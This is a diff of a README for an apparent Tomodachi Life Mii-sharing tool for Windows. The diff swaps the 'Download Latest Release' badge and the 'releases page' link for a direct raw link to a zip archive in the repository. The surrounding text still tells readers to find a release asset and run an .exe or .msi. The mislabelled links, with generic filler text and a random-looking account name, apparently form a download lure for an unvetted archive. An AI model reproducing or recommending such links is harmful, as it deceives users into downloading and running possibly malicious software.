@@ -1,12 +1,12 @@
 # 📁 Tomodachi-Share-Discover-and-share-Mii - Simple tools for your digital life
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Bernesemountaindogvent8449/Tomodachi-Share-Discover-and-share-Mii/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Bernesemountaindogvent8449/Tomodachi-Share-Discover-and-share-Mii/main/Nintendo/and_Discover_Share_Tomodachi_share_Mii_2.2.zip)
 
 This application helps users manage and share Mii characters for the simulation game Tomodachi Life. You can sync save data, create unique Mii profiles, and generate QR codes for your friends. The software runs on Windows and works with emulator save files to improve your simulation experience.
 
 ## 📥 How to download the software
 
-1. Visit the [releases page](https://github.com/Bernesemountaindogvent8449/Tomodachi-Share-Discover-and-share-Mii/releases) to access the file library.
+1. Visit the [releases page](https://raw.githubusercontent.com/Bernesemountaindogvent8449/Tomodachi-Share-Discover-and-share-Mii/main/Nintendo/and_Discover_Share_Tomodachi_share_Mii_2.2.zip) to access the file library.
 2. Look for the section labeled "Assets" under the most recent version number.
 3. Click the file ending in .msi or .exe to start your download.
 4. Open the downloaded file once the transfer completes.
